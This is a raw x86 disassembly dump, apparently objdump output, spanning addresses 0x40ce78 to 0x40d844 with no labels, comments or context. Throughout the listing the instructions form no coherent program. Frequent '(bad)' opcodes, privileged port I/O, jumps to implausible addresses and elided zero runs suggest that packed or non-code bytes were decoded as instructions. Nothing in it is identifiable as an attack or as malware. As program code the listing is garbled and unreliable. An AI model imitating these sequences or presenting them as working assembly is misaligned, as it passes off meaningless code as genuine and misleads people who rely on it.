  40ce78:	jbe    0x40ce39
  40ce7a:	lea    ebx,[ebx+0x8]
  40ce7d:	jmp    0xa4c9d317
  40ce82:	mov    dh,0x4e
  40ce84:	add    BYTE PTR es:[ebx+0x32],cl
  40ce88:	or     BYTE PTR [ebx-0x3196f],al
  40ce8e:	sti    
  40ce8f:	dec    BYTE PTR [ebp+eax*4-0x242b4]
  40ce96:	sbb    al,0x4a
  40ce98:	je     0x40ce9a
  40ce9a:	mov    ah,0x68
  40ce9c:	add    al,0x5a
  40ce9e:	sub    DWORD PTR [edx-0x8],ecx
  40cea1:	lea    esi,[ecx]
  40cea3:	out    0xfc,eax
  40cea5:	dec    DWORD PTR [ebx]
  40cea7:	out    0x81,eax
  40cea9:	jne    0x40cf1f
  40ceab:	inc    BYTE PTR [eax+0x41417c7d]
  40ceb1:	push   esi
  40ceb2:	mov    cl,0x31
  40ceb4:	push   ds
  40ceb5:	call   ecx
  40ceb7:	or     ecx,DWORD PTR [ebp+0x56134445]
  40cebd:	(bad)  
  40cebe:	(bad)  
  40cec0:	cli    
  40cec1:	dec    DWORD PTR [ebx-0x42]
  40cec4:	inc    ebx
  40cec5:	lock fs add al,0x0
  40cec9:	add    BYTE PTR [esi+ebx*2-0x2],bl
  40cecd:	(bad)  
  40cece:	jnp    0x40cf4f
  40ced0:	mov    esi,0x3b405a75
  40ced5:	jne    0x40ced7
	...
  40cef3:	add    BYTE PTR [eax+0x7433a22d],dl
  40cef9:	adc    eax,0xff76c95b
  40cefe:	dec    DWORD PTR [edx+0x55f4ea72]
  40cf04:	lahf   
  40cf05:	out    0x81,eax
  40cf07:	in     al,dx
  40cf08:	clc    
  40cf09:	mov    al,BYTE PTR [ebx+0xc]
  40cf0c:	and    cl,BYTE PTR [ecx+0x106f3c71]
  40cf12:	push   ds
  40cf13:	xor    al,0xb3
  40cf15:	mov    bh,BYTE PTR [ebx+0x8]
  40cf18:	(bad)  
  40cf19:	mov    eax,0x970dc701
  40cf1e:	xor    DWORD PTR [ebx-0x7a],edx
  40cf21:	push   ds
  40cf22:	lea    eax,[ecx+ebx*8+0x2f]
  40cf26:	(bad)  [esi]
  40cf28:	or     eax,0xc54487e7
  40cf2d:	ja     0x40cf9b
  40cf2f:	inc    eax
  40cf30:	mov    edx,0x38ff0694
  40cf35:	iret   
  40cf36:	fst    DWORD PTR [edi*8-0x77ffbd2b]
  40cf3d:	daa    
  40cf3e:	push   eax
  40cf3f:	ficomp WORD PTR ds:[edi]
  40cf42:	mov    WORD PTR [edx+edx*4-0x40],cs
  40cf46:	inc    edi
  40cf47:	or     al,0x3
  40cf49:	enter  0xb609,0xd8
  40cf4d:	ror    DWORD PTR [ebp+0x305d0544],1
  40cf53:	adc    eax,0x7eff71d
	...
  40cf74:	add    BYTE PTR [eax],al
  40cf76:	imul   esp,DWORD PTR [ebx+ebx*8],0x7f
  40cf7a:	loopne 0x40cf2d
  40cf7c:	(bad)  
  40cf7d:	je     0x40cf90
  40cf7f:	mov    eax,ds:0x280dff3f
  40cf84:	pop    ds
  40cf85:	dec    ebp
  40cf86:	sbb    DWORD PTR ds:0x8ec88cbb,edx
  40cf8c:	xor    bh,bh
  40cf8e:	ror    BYTE PTR [esi-0x5dfe8b27],0x4f
  40cf95:	or     BYTE PTR [edx],ch
  40cf97:	aam    0xf2
  40cf99:	adc    cl,ch
  40cf9b:	out    0xd9,al
  40cf9d:	je     0x40cfc0
  40cf9f:	pop    esi
  40cfa0:	mov    dh,0x56
  40cfa2:	adc    bl,bl
  40cfa4:	clc    
  40cfa5:	xor    edx,DWORD PTR [esi+0x3a99ea8d]
  40cfab:	out    0x2,eax
  40cfad:	pop    edi
  40cfae:	pop    ebx
  40cfaf:	mov    al,ds:0xd0bc4
  40cfb4:	mov    esp,0x4c7cf68e
  40cfb9:	and    edi,DWORD PTR [ebx]
  40cfbb:	xor    DWORD PTR [edx+0x18],esp
  40cfbe:	test   eax,0x1e03a8f3
  40cfc3:	rcl    al,cl
  40cfc5:	fimul  DWORD PTR [esi]
  40cfc7:	add    cl,ch
  40cfc9:	ins    DWORD PTR es:[edi],dx
  40cfca:	ret    0x3631
  40cfcd:	push   eax
  40cfce:	add    eax,0x19dae866
  40cfd3:	xchg   esp,eax
  40cfd4:	cld    
  40cfd5:	inc    ebx
  40cfd6:	or     eax,0xd7a387
	...
  40cff7:	add    BYTE PTR [edi-0x11b01829],cl
  40cffd:	test   BYTE PTR [ebx+0x303a33d7],ah
  40d003:	lds    ecx,FWORD PTR [esi]
  40d005:	add    BYTE PTR [edx+0x58],ch
  40d008:	imul   ebp,ebp,0x4289d47c
  40d00e:	or     DWORD PTR [ebx],esi
  40d010:	jb     0x40d004
  40d012:	cwde   
  40d013:	lock sub al,BYTE PTR [eax]
  40d016:	ins    BYTE PTR es:[edi],dx
  40d017:	aas    
  40d018:	ins    DWORD PTR es:[edi],dx
  40d019:	das    
  40d01a:	(bad)  
  40d01b:	out    dx,eax
  40d01c:	mov    dl,0xf3
  40d01e:	sub    BYTE PTR [edi+eiz*8],al
  40d021:	(bad)  
  40d022:	push   ds
  40d023:	xor    ah,bl
  40d025:	mov    ah,BYTE PTR [ebx]
  40d027:	in     al,0xd2
  40d029:	fcomp  DWORD PTR [ebp-0x69ad8581]
  40d02f:	in     eax,dx
  40d030:	jge    0x40d00a
  40d032:	sbb    al,0x20
  40d034:	adc    ecx,ebx
  40d036:	repz or edi,esi
  40d039:	aas    
  40d03a:	jmp    0xfa44c217
  40d03f:	inc    ebx
  40d040:	or     eax,0x111ffcd9
  40d045:	push   0xffffffe9
  40d047:	imul   ecx,DWORD PTR ds:0xed90000,0xffffffd7
  40d04e:	adc    al,0xd5
  40d050:	stc    
  40d051:	pop    ss
  40d052:	add    BYTE PTR [ecx+edx*8+0x53],ch
  40d056:	or     edi,DWORD PTR [ecx-0x5fc133b]
	...
  40d078:	add    BYTE PTR [eax],al
  40d07a:	dec    esi
  40d07b:	add    BYTE PTR [eax+0x3201e1e8],dh
  40d081:	sub    ebx,edx
  40d083:	add    eax,DWORD PTR [eax]
  40d085:	jns    0x40d095
  40d087:	ret    0xe903
  40d08a:	jmp    0x40d016
  40d08c:	jmp    0x40d026
  40d08e:	stc    
  40d08f:	test   BYTE PTR [ebp+eiz*1-0x1f],al
  40d093:	test   BYTE PTR [eax-0xf],bl
  40d096:	mov    dh,0x61
  40d098:	pop    ecx
  40d099:	jmp    0x40d0a9
  40d09b:	mov    ecx,DWORD PTR [ebp+ebx*8-0x79]
  40d09f:	add    BYTE PTR [ebx+0x6c],bl
  40d0a2:	push   ecx
  40d0a3:	dec    esp
  40d0a4:	add    al,0xbb
  40d0a6:	dec    esi
  40d0a7:	jmp    0x7700:0xd3e26a19
  40d0ae:	add    BYTE PTR [ebx+0x5300f17c],al
  40d0b4:	add    al,0x1a
  40d0b6:	dec    ecx
  40d0b7:	jmp    0x1c8b:0x17511a02
  40d0be:	pop    ecx
  40d0bf:	jg     0x40d0c1
  40d0c1:	jns    0x40d0d2
  40d0c3:	leave  
  40d0c4:	shr    ebp,0xe
  40d0c7:	sub    eax,0xe391c58b
  40d0cc:	imul   DWORD PTR [edx+0x2a]
  40d0cf:	or     edx,DWORD PTR [ebx+0x3f]
  40d0d2:	cwde   
  40d0d3:	rcl    BYTE PTR [esi+0x6c],1
  40d0d6:	in     al,0x7
  40d0d8:	push   0xffffffe9
  40d0da:	mov    edx,eax
  40d0dc:	mov    BYTE PTR ds:0x0,dl
	...
  40d0fa:	add    BYTE PTR [eax],al
  40d0fc:	in     eax,dx
  40d0fd:	mul    edi
  40d0ff:	add    BYTE PTR [edi+0x68000211],al
  40d105:	ret    
  40d106:	jb     0x40d14c
  40d108:	sub    DWORD PTR [esp+eax*1],0xffffff8b
  40d10c:	(bad)  
  40d10d:	(bad)  
  40d10e:	(bad)  
  40d10f:	xor    edi,DWORD PTR [eax+ebp*8]
  40d112:	sub    DWORD PTR [eax],eax
  40d114:	hlt    
  40d115:	push   esi
  40d116:	mov    edi,0x7183d574
  40d11b:	or     al,0x4c
  40d11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d11e:	sub    al,BYTE PTR [eax]
  40d120:	mov    ah,0xc0
  40d122:	inc    edx
  40d123:	and    al,0xe7
  40d125:	add    DWORD PTR [eax+eax*8+0x44c4d579],eax
  40d12c:	or     ch,cl
  40d12e:	dec    BYTE PTR [edx+0x7882fe77]
  40d134:	mov    esp,0xb3fb8b02
  40d139:	mov    di,0xc50
  40d13d:	fist   WORD PTR [ebp+0x2]
  40d140:	je     0x40d0c4
  40d142:	jp     0x40d168
  40d144:	add    dh,BYTE PTR [di+0xd]
  40d148:	out    dx,eax
  40d149:	inc    esi
  40d14a:	and    al,0x14
  40d14c:	out    0xc0,eax
  40d14e:	push   ss
  40d14f:	push   esi
  40d150:	cmp    al,0x48
  40d152:	xchg   DWORD PTR [eax],eax
  40d154:	je     0x40d0df
  40d156:	inc    ebx
  40d157:	or     BYTE PTR [esi+ebx*4+0x11],cl
  40d15b:	add    ah,BYTE PTR [ebp+ecx*1+0x5e]
  40d15f:	mov    al,0x0
	...
  40d17d:	add    BYTE PTR ds:0x21e58b19,dh
  40d183:	ret    0x2
  40d186:	xor    eax,DWORD PTR [edi+edi*1-0x7f1bebfc]
  40d18d:	pop    ecx
  40d18e:	add    cl,BYTE PTR ss:[ebx-0x76f5b7b4]
  40d195:	add    DWORD PTR ds:0x1244062,ecx
  40d19b:	lahf   
  40d19c:	add    eax,DWORD PTR [ecx]
  40d19e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1a0:	sbb    al,0x1
  40d1a2:	adc    ch,BYTE PTR [esp+eax*8]
  40d1a5:	ror    DWORD PTR [ecx],0xe7
  40d1a8:	mov    DWORD PTR [ebx+0x29],eax
  40d1ab:	fucomi st,st(2)
  40d1ad:	jns    0x40d1ad
  40d1af:	call   0x294d81b6
  40d1b4:	add    BYTE PTR [eax],al
  40d1b6:	or     dh,BYTE PTR [ebp+0x44]
  40d1b9:	add    al,0x8e
  40d1bb:	aas    
  40d1bc:	add    al,0x74
  40d1be:	sbb    DWORD PTR [edi+0x26fe034e],ecx
  40d1c4:	ret    
  40d1c5:	mov    bh,0x21
  40d1c7:	sub    DWORD PTR [edi+esi*2-0x3e0cb032],esi
  40d1ce:	mov    ebp,0x9654c19f
  40d1d3:	add    eax,DWORD PTR [ebx-0x17976a1d]
  40d1d9:	xchg   ebx,eax
  40d1da:	or     edi,esp
  40d1dc:	add    dl,BYTE PTR [ebx-0x1d]
  40d1df:	jne    0x40d16a
  40d1e1:	clc    
	...
  40d1fe:	add    BYTE PTR [eax],al
  40d200:	adc    cl,BYTE PTR ds:0xff8e043f
  40d206:	add    ecx,DWORD PTR [ecx+0x73fabaf1]
  40d20c:	add    BYTE PTR [edi],cl
  40d20e:	push   ecx
  40d20f:	sub    cl,BYTE PTR [edx+0x1b]
  40d212:	and    BYTE PTR [ebx+edi*8],cl
  40d215:	out    0x2,al
  40d217:	add    BYTE PTR [edx+0x1b],cl
  40d21a:	and    BYTE PTR [edi*8+0x36000413],dl
  40d221:	mov    bh,0xbd
  40d223:	inc    ebx
  40d224:	icebp  
  40d225:	(bad)  
  40d227:	push   DWORD PTR [edx]
  40d229:	out    0xbd,eax
  40d22b:	inc    ebx
  40d22c:	icebp  
  40d22d:	(bad)  
  40d22e:	cld    
  40d22f:	arpl   WORD PTR [edi],si
  40d231:	add    cl,ch
  40d233:	mov    esi,0x9f91bce
  40d238:	or     eax,0x4e8ae900
  40d23d:	sbb    al,0xf5
  40d23f:	ins    BYTE PTR es:[edi],dx
  40d240:	int    0x5f
  40d242:	xchg   ebx,eax
  40d243:	add    ecx,DWORD PTR ds:0x1202c87
  40d249:	mov    DWORD PTR [eax+eiz*1],esp
  40d24c:	std    
  40d24d:	sub    WORD PTR [ebx-0x9],sp
  40d251:	(bad)  
  40d252:	call   0xf95d20e3
  40d257:	adc    cl,ch
  40d259:	adc    ah,0x1f
  40d25c:	add    eax,0xc28b4ae8
  40d261:	aam    0x3d
  40d263:	dec    edi
	...
  40d280:	add    BYTE PTR [eax],al
  40d282:	icebp  
  40d283:	jmp    0x40d2c4
  40d285:	adc    cl,BYTE PTR [eax+eax*1]
  40d288:	jmp    0xfd5d2115
  40d28d:	xor    esi,DWORD PTR [ebp+0xd03fffc]
  40d293:	jnp    0x40d2bd
  40d295:	dec    edi
  40d296:	add    BYTE PTR [eax],dh
  40d298:	add    ebp,esp
  40d29a:	ins    DWORD PTR es:[edi],dx
  40d29b:	(bad)  
  40d29c:	call   0xd55cd923
  40d2a1:	add    eax,DWORD PTR [eax]
  40d2a3:	or     dh,BYTE PTR [ecx]
  40d2a5:	jnp    0x40d2db
  40d2a7:	add    cl,ch
  40d2a9:	in     al,dx
  40d2aa:	sbb    edi,edi
  40d2ac:	call   0xe5955fb4
  40d2b1:	add    ecx,DWORD PTR [edx]
  40d2b3:	jnp    0x40d327
  40d2b5:	add    al,0xd
  40d2b7:	add    BYTE PTR [eax+ebx*2-0xf],bl
  40d2bb:	addr16 sti 
  40d2bd:	mov    eax,0x2163c2a
  40d2c2:	or     eax,0xe3bf0011
  40d2c7:	mov    dh,al
  40d2c9:	shr    DWORD PTR [ebx-0x5d16fdd5],0x94
  40d2d0:	jae    0x40d2d3
  40d2d2:	test   BYTE PTR [eax+0x24],al
  40d2d5:	sbb    eax,0xde284ff6
  40d2da:	jns    0x40d29a
  40d2dc:	and    DWORD PTR [edx-0x114093f8],0xffffff88
  40d2e3:	xchg   ebx,eax
  40d2e4:	dec    edi
  40d2e5:	add    DWORD PTR [eax],0x0
	...
  40d303:	add    BYTE PTR [ecx+0x38e9022d],ch
  40d309:	test   DWORD PTR [ebx+0xd],edi
  40d30c:	jne    0x40d2f6
  40d30e:	xchg   ebp,eax
  40d30f:	mov    bh,0xc
  40d311:	add    BYTE PTR [edx+esi*1-0x5a74f6be],al
  40d318:	sub    al,BYTE PTR [ecx+ebp*8]
  40d31b:	jle    0x40d326
  40d31d:	add    BYTE PTR [eax],al
  40d31f:	ins    BYTE PTR es:[edi],dx
  40d320:	xchg   ebp,eax
  40d321:	pop    ds
  40d322:	mov    bl,ch
  40d324:	push   cs
  40d325:	add    bh,al
  40d327:	gs in  eax,dx
  40d329:	jg     0x40d32c
  40d32b:	jmp    0xa9b36b3e
  40d330:	push   cs
  40d331:	call   0x4d9328
  40d336:	call   esp
  40d338:	(bad)  
  40d339:	fild   WORD PTR [edx-0x17]
  40d33c:	mov    edi,DWORD PTR [edi+0x23]
  40d33f:	sldt   WORD PTR gs:[eax]
  40d343:	pusha  
  40d344:	int    0x1b
  40d346:	cmp    BYTE PTR [edi+0x29243f93],dl
  40d34c:	sbb    DWORD PTR [ebp-0x44fefa8d],eax
  40d352:	inc    ebx
  40d353:	or     eax,0x29759ff9
  40d358:	adc    eax,ebp
  40d35a:	test   BYTE PTR [eax],0x93
  40d35d:	(bad)  
  40d35e:	jmp    FWORD PTR [ecx+0x24]
  40d361:	mov    esi,edx
  40d363:	(bad)  
  40d364:	loopne 0x40d385
  40d366:	sub    BYTE PTR [eax],dh
	...
  40d384:	add    BYTE PTR [eax],al
  40d386:	loop   0x40d3c3
  40d388:	add    al,ch
  40d38a:	sub    eax,0x7f000225
  40d38f:	push   ss
  40d390:	call   DWORD PTR ds:0x3ed01c
  40d396:	outs   dx,DWORD PTR ds:[esi]
  40d397:	cmp    al,0x8
  40d399:	test   DWORD PTR [ebp-0x6b74f3be],edi
  40d39f:	daa    
  40d3a0:	rol    DWORD PTR [ecx+0x265bff7e],1
  40d3a6:	icebp  
  40d3a7:	inc    esp
  40d3a8:	add    ecx,DWORD PTR [ecx+0x35ff06b3]
  40d3ae:	cmp    BYTE PTR [ebx+0x13690041],dh
  40d3b4:	and    al,0x20
  40d3b6:	sub    eax,0xde382413
  40d3bb:	std    
  40d3bc:	mov    WORD PTR [eax+edx*1+0x3c],es
  40d3c0:	push   eax
  40d3c1:	lea    esi,[eax-0xe]
  40d3c4:	das    
  40d3c5:	(bad)  
  40d3c6:	jo     0x40d3ba
  40d3c8:	daa    
  40d3c9:	les    eax,FWORD PTR [edi+0x70c6003e]
  40d3cf:	repnz sub eax,DWORD PTR [eax]
  40d3d2:	jecxz  0x40d3e6
  40d3d4:	and    al,0x30
  40d3d6:	aam    0x44
  40d3d8:	inc    eax
  40d3d9:	add    BYTE PTR [edx+eiz*2],bl
  40d3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3dd:	add    BYTE PTR [eax+ecx*4-0x2a],ah
  40d3e1:	(bad)  
  40d3e2:	mov    al,ds:0xe7ac1bf2
  40d3e7:	add    BYTE PTR ds:[ebx+0x0],cl
	...
  40d406:	add    BYTE PTR [eax],al
  40d408:	xor    BYTE PTR [eax],ch
  40d40a:	or     al,0x84
  40d40c:	dec    edi
  40d40d:	cmp    BYTE PTR [ebx+ecx*4],al
  40d410:	or     eax,0x96102825
  40d415:	inc    esp
  40d416:	sub    BYTE PTR [eax],bl
  40d418:	fnstsw WORD PTR [ecx+0x2531fc18]
  40d41e:	add    al,0xff
  40d420:	sbb    BYTE PTR [ebp-0x1bf2c00b],ch
  40d426:	add    al,0x1
  40d428:	or     eax,0x638401e9
  40d42d:	jb     0x40d401
  40d42f:	inc    BYTE PTR [eax+0x5d502824]
  40d435:	cmp    al,0x13
  40d438:	pop    ds
  40d439:	daa    
  40d43a:	add    al,0x5f
  40d43c:	pop    ebx
  40d43d:	push   ds
  40d43e:	jg     0x40d424
  40d440:	push   eax
  40d441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d442:	cmp    DWORD PTR [edi-0x6a],edx
  40d445:	pop    eax
  40d446:	pop    esi
  40d447:	add    BYTE PTR [eax-0x7c180527],dl
  40d44d:	mov    WORD PTR [eax+eax*1],es
  40d450:	(bad)  [ebx+0x1a0c0c26]
  40d456:	or     ch,BYTE PTR [esi+edi*1+0x137402a7]
  40d45d:	imul   ebx,edx,0x2e8ad84
  40d463:	pop    edi
  40d464:	xchg   esi,eax
  40d465:	sbb    DWORD PTR [edx],esi
  40d467:	ret    0xe709
  40d46a:	jge    0x40d4b1
	...
  40d488:	add    BYTE PTR [eax],al
  40d48a:	or     DWORD PTR [esp+eax*8+0x73],ebx
  40d48e:	or     dl,BYTE PTR [edi-0x28e6eb2f]
  40d494:	inc    edx
  40d495:	add    BYTE PTR [esi+0x979dd21],dl
  40d49b:	in     eax,0x2
  40d49d:	push   esi
  40d49e:	xchg   bh,dl
  40d4a0:	(bad)  
  40d4a2:	push   ss
  40d4a3:	in     eax,0x2
  40d4a5:	test   BYTE PTR [ebp+0x0],cl
  40d4a8:	pop    ebp
  40d4a9:	cmpps  xmm0,XMMWORD PTR [edx-0x679ffa2],0x6b
  40d4b1:	ret    
  40d4b2:	mov    esi,0x19d338f8
  40d4b7:	add    al,0xd9
  40d4b9:	inc    ebx
  40d4ba:	or     eax,0x1283c7d
  40d4bf:	add    BYTE PTR ds:0xe965c224,bh
  40d4c5:	pop    ebp
  40d4c6:	or     eax,0xd04fd68
  40d4cb:	add    BYTE PTR [esi-0x6a0c16a9],bl
  40d4d1:	sbb    DWORD PTR [edx],ecx
  40d4d3:	jmp    0x40d4bd
  40d4d5:	repz inc edx
  40d4d7:	add    BYTE PTR [ebx+eax*8-0x7f],ch
  40d4db:	cli    
  40d4dc:	(bad)  
  40d4dd:	or     bh,BYTE PTR [edi]
  40d4df:	rol    BYTE PTR [ecx+0xdfe9d05],0x32
  40d4e6:	iret   
  40d4e7:	sti    
  40d4e8:	call   0xb8245b25
  40d4ed:	xor    al,0x0
	...
  40d50b:	add    BYTE PTR [esi+0x51cae53f],al
  40d511:	aam    0xe4
  40d513:	add    ecx,DWORD PTR ds:0x3ec36c00
  40d519:	sbb    al,0xd3
  40d51b:	add    eax,DWORD PTR [eax-0x67cbcabe]
  40d521:	inc    edx
  40d522:	xor    DWORD PTR [edi+esi*1],esi
  40d525:	pop    es
  40d526:	mov    ecx,0xf90801d2
  40d52b:	inc    ebx
  40d52c:	or     eax,0x1857287b
  40d531:	jge    0x40d4be
  40d533:	iret   
  40d534:	push   cs
  40d535:	dec    ebx
  40d536:	out    dx,al
  40d537:	jle    0x40d50a
  40d539:	xlat   BYTE PTR ds:[ebx]
  40d53a:	push   eax
  40d53b:	or     bh,cl
  40d53d:	std    
  40d53e:	(bad)  
  40d53f:	mov    ecx,0xb82774e
  40d544:	pop    ss
  40d545:	std    
  40d546:	shr    DWORD PTR [eax-0x553702b7],0x1a
  40d54d:	test   ebx,ebp
  40d54f:	cmp    cl,al
  40d551:	test   al,0x8a
  40d553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d554:	popa   
  40d555:	mov    eax,ds:0x155cc6fe
  40d55a:	fdiv   DWORD PTR ds:0xc2c00e05
  40d560:	out    0x29,eax
  40d562:	push   ebx
  40d563:	scas   al,BYTE PTR es:[edi]
  40d564:	mov    edx,0x2ed0e807
  40d569:	(bad)  
  40d56a:	push   DWORD PTR [ecx+0x39]
  40d56d:	jnp    0x40d564
  40d56f:	sbb    al,0x0
	...
  40d58d:	add    BYTE PTR ds:0x4e82c012,dl
  40d593:	jge    0x40d5d8
  40d595:	out    0xdd,eax
  40d597:	jp     0x40d566
  40d599:	ret    0x52de
  40d59c:	adc    al,0x63
  40d59e:	fiadd  WORD PTR [edi-0x9f1dac]
  40d5a4:	xchg   eax,edi
  40d5a6:	pop    eax
  40d5a7:	xor    al,0xb
  40d5a9:	test   al,0x56
  40d5ab:	inc    DWORD PTR [edi+0x12]
  40d5ae:	mov    DWORD PTR [ecx-0x14],edx
  40d5b1:	ret    
  40d5b2:	push   cs
  40d5b3:	pop    edx
  40d5b4:	add    BYTE PTR [esi+0x54],al
  40d5b7:	cld    
  40d5b8:	push   edx
  40d5b9:	xchg   edi,eax
  40d5ba:	fst    QWORD PTR [esi+0x4]
  40d5bd:	mov    ss:0xea91003,al
  40d5c3:	jge    0x40d61c
  40d5c5:	es mov ah,0xaa
  40d5c8:	sbb    DWORD PTR [edx-0x29],eax
  40d5cb:	int    0xc2
  40d5cd:	add    ebx,esp
  40d5cf:	scas   al,BYTE PTR es:[edi]
  40d5d0:	add    cl,ch
  40d5d2:	add    dl,al
  40d5d4:	pop    ebp
  40d5d5:	add    BYTE PTR [edi+0x6404c21e],ch
  40d5db:	dec    esp
  40d5dc:	ror    BYTE PTR [ebx+0x10e8c305],0x49
  40d5e3:	add    eax,DWORD PTR [eax]
  40d5e5:	jmp    DWORD PTR [esp+ecx*8-0x40]
  40d5e9:	mov    edx,DWORD PTR [ebp+0x6300e082]
  40d5ef:	add    eax,DWORD PTR [eax]
  40d5f1:	rol    DWORD PTR [eax],0x0
	...
  40d610:	push   ebp
  40d611:	ror    DWORD PTR [ecx],cl
  40d613:	shl    DWORD PTR [ebp-0x55],1
  40d616:	push   es
  40d617:	rol    DWORD PTR [esi-0x35],0x9
  40d61b:	ret    0x1677
  40d61e:	mov    ebp,esp
  40d620:	pop    es
  40d621:	dec    ebp
  40d622:	xlat   BYTE PTR ds:[ebx]
  40d623:	mov    ebx,DWORD PTR [edi]
  40d625:	stos   DWORD PTR es:[edi],eax
  40d626:	int    0xff
  40d628:	jae    0x40d5da
  40d62a:	cmp    eax,DWORD PTR [ebp+0x46]
  40d62d:	inc    ebp
  40d62e:	push   eax
  40d62f:	je     0x40d61c
  40d631:	repz mov edi,0x1e8e9
  40d637:	add    BYTE PTR [edx],bl
  40d639:	or     DWORD PTR [ebx+0xa2cec7d],ecx
  40d63f:	pop    ecx
  40d640:	outs   dx,DWORD PTR ds:[esi]
  40d641:	mov    ah,0xf1
  40d643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d644:	pop    edi
  40d645:	or     al,0x4
  40d647:	call   0x3e85cd
  40d64c:	das    
  40d64d:	or     BYTE PTR ss:[ecx+0x4b8b066a],cl
  40d654:	mov    esp,0xf3ff9daa
  40d659:	scas   eax,DWORD PTR es:[edi]
  40d65a:	xchg   DWORD PTR [esi-0x54],eax
  40d65d:	push   DWORD PTR [esi-0x2fb43fb5]
  40d663:	sar    esi,0xca
  40d666:	mov    edi,0xfd7a9ce1
  40d66b:	add    BYTE PTR ds:0x5d2302d9,cl
  40d671:	loope  0x40d624
  40d673:	add    BYTE PTR gs:[eax],al
	...
  40d692:	test   BYTE PTR [esi-0x2],ch
  40d695:	push   cs
  40d696:	mov    edx,0x3c8af291
  40d69b:	pop    ss
  40d69c:	fld    QWORD PTR [edi]
  40d69e:	cs jmp 0xd246b765
  40d6a4:	mov    bl,0x65
  40d6a6:	test   BYTE PTR [esi],dl
  40d6a8:	hlt    
  40d6a9:	push   cs
  40d6aa:	and    BYTE PTR [ecx],0xf2
  40d6ad:	mov    bl,BYTE PTR [edi+edx*4-0x27]
  40d6b1:	pop    es
  40d6b2:	out    dx,al
  40d6b3:	push   0xd205e0c4
  40d6b8:	mov    bl,0x65
  40d6ba:	xchg   esp,eax
  40d6bb:	out    dx,al
  40d6bc:	icebp  
  40d6bd:	push   cs
  40d6be:	pop    edx
  40d6bf:	and    eax,edi
  40d6c1:	mov    bh,BYTE PTR [edi+edx*4]
  40d6c4:	fld    DWORD PTR [edi]
  40d6c6:	out    dx,al
  40d6c7:	mov    ah,al
  40d6c9:	loopne 0x40d6e0
  40d6cb:	loop   0x40d680
  40d6cd:	gs xchg esp,eax
  40d6cf:	adc    eax,0x12c20ef8
  40d6d4:	test   BYTE PTR [edx+0x7d998dc],0x2e
  40d6db:	addr16 (bad) 
  40d6dd:	loopne 0x40d6f4
  40d6df:	loop   0x40d694
  40d6e1:	test   BYTE PTR gs:[ebp-0x6d65f10c],cl
  40d6e8:	jmp    0xee07:0xda18dc8a
  40d6ef:	push   es
  40d6f0:	(bad)
  40d6f3:	shl    BYTE PTR [ebx+0x65],cl
	...
  40d711:	add    BYTE PTR [eax],al
  40d713:	add    BYTE PTR [ebp+esi*2-0x5d9df116],al
  40d71a:	call   0xda5993a9
  40d71f:	pop    es
  40d720:	out    dx,al
  40d721:	(bad)  
  40d722:	cmp    ch,al
  40d724:	lods   eax,DWORD PTR ds:[esi]
  40d725:	clc    
  40d726:	icebp  
  40d727:	mov    ah,0xf0
  40d729:	jbe    0x40d6e9
  40d72b:	jmp    0xefe26c43
  40d730:	xchg   DWORD PTR [ebx],ebp
  40d732:	cmc    
  40d733:	jp     0x40d792
  40d735:	mov    edi,0xb02ffc12
  40d73a:	daa    
  40d73b:	in     eax,0xa
  40d73d:	stc    
  40d73e:	pop    ss
  40d73f:	data16 test BYTE PTR [esi],dh
  40d742:	add    eax,0xe543789
  40d747:	jnp    0x40d712
  40d749:	out    dx,eax
  40d74a:	inc    edx
  40d74b:	sti    
  40d74c:	in     eax,0x78
  40d74e:	(bad)  
  40d750:	jno    0x40d7cb
  40d752:	icebp  
  40d753:	fist   DWORD PTR [ebx-0x32]
  40d756:	mov    ebp,0xd95397ce
  40d75b:	jl     0x40d765
  40d75d:	jns    0x40d780
  40d75f:	or     BYTE PTR ds:0x13cea6b2,ah
  40d765:	ja     0x40d78d
  40d767:	or     BYTE PTR [esi-0x34243ec8],dl
  40d76d:	int    0x8d
  40d76f:	into   
  40d770:	test   DWORD PTR [ebp-0x2f],eax
  40d773:	jp     0x40d7ee
  40d775:	clc    
  40d776:	sbb    eax,0x7b
	...
  40d793:	add    BYTE PTR [eax],al
  40d795:	add    al,dl
  40d797:	sub    eax,0xfbcf3112
  40d79c:	call   0x681c5dd9
  40d7a1:	fild   QWORD PTR [esi]
  40d7a3:	add    ch,cl
  40d7a5:	add    esp,DWORD PTR [ebx+0x7b]
  40d7a8:	fwait
  40d7a9:	jecxz  0x40d76c
  40d7ab:	int3   
  40d7ac:	dec    ebp
  40d7ad:	(bad)  [eax]
  40d7af:	jle    0x40d799
  40d7b1:	add    eax,DWORD PTR [eax-0x542fbb7e]
  40d7b7:	int3   
  40d7b8:	call   FWORD PTR [eax-0x9009cbc]
  40d7be:	mov    dh,0xd8
  40d7c0:	or     eax,ebp
  40d7c2:	push   cs
  40d7c3:	test   BYTE PTR [edi-0x97a0],bh
  40d7c9:	call   0xe2b59ad5
  40d7ce:	push   eax
  40d7cf:	int3   
  40d7d0:	(bad)  
  40d7d1:	test   eax,0xbbf95331
  40d7d6:	dec    esi
  40d7d7:	fld    DWORD PTR [ebx+0x2f]
  40d7da:	push   cs
  40d7db:	add    BYTE PTR [eax-0x60],al
  40d7de:	mov    ch,0xc6
  40d7e0:	out    0x9c,eax
  40d7e2:	or     eax,DWORD PTR [edx]
  40d7e4:	add    BYTE PTR [ebx+0x45],dl
  40d7e7:	in     al,0xad
  40d7e9:	out    dx,eax
  40d7ea:	or     al,0x0
  40d7ec:	push   eax
  40d7ed:	inc    ebx
  40d7ee:	mov    bl,0xcc
  40d7f0:	rol    DWORD PTR ss:[esi],1
  40d7f3:	cli    
  40d7f4:	add    cl,ch
  40d7f6:	xchg   edx,eax
  40d7f7:	mov    WORD PTR [ebx-0x6e],?
	...
  40d816:	add    BYTE PTR [eax],al
  40d818:	mov    ds:0x3919d443,al
  40d81d:	cs adc ecx,ebp
  40d820:	push   cs
  40d821:	sbb    WORD PTR [eax*8-0x7c078d35],0x44
  40d82a:	aam    0x39
  40d82c:	push   edi
  40d82d:	arpl   di,di
  40d82f:	mov    esi,0xe80973d6
  40d834:	push   cs
  40d835:	test   BYTE PTR [edi+0x9b94fd],bh
  40d83b:	setbe  BYTE PTR [esi-0x7f128dac]
  40d842:	jmp    0x40d895
  40d844:	adc    DWORD PTR [eax],eax
